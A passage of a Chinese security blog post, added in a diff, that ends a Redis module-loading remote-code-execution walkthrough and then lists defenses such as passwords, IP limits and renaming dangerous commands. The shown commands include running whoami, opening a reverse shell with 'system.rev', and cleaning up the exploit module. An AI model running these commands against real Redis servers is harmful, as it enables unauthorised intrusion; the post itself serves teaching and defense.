class="comment">#切断主从，关闭复制功能</span></span><br><span class="line">    slaveof no <span class="literal">one</span> </span><br><span class="line"><span class="comment">#执行系统命令</span></span><br><span class="line">    <span class="keyword">system</span>.exec <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">    <span class="keyword">system</span>.rev <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">9999</span>    </span><br><span class="line"><span class="comment">#通过dump.rdb文件恢复数据</span></span><br><span class="line">    config <span class="built_in">set</span> dbfilename dump.rdb</span><br><span class="line"><span class="comment">#删除exp.so</span></span><br><span class="line">    <span class="keyword">system</span>.exec <span class="string">&#x27;rm ./exp.so&#x27;</span></span><br><span class="line"><span class="comment">#卸载system模块的加载</span></span><br><span class="line">    module <span class="built_in">unload</span> <span class="keyword">system</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h1><ol>
+<li><p>限制ip访问 如修改的配置文件</p>
+</li>
+<li><p>增加远程登录密码</p>
+</li>
+<li><p>禁止远程危险命令</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rename</span>-<span class="keyword">command</span> <span class="title">FLUSHALL</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">rename</span>-<span class="keyword">command</span> <span class="title">CONFIG</span>   <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">rename</span>-<span class="keyword">command</span> <span class="title">EVAL</span>     <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>低权限运行Redis服务</p>
+</li>
+</ol>
+<p>为Redis服务创建单独的<code>user</code>和<code>home</code>目录，并且配置禁止登陆</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure>
+
+<p>保证authorized_keys文件的安全</p>
+<p>阻止其他用户添加新的公钥。将<code>authorized_keys</code>的权限设置为对拥有者只读，其他用户没有任何权限</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"># web</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/06/03/python_debug_pin/" rel="prev" title="flask_debug_pin">
+                  <i class="fa fa-angle-left"></i> flask_debug_pin
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/06/20/jwt/" rel="next" title="jwt攻击">
+                  jwt攻击 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">baicany</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right"},"mobile":{"show":true}});</script></body>
+</html>
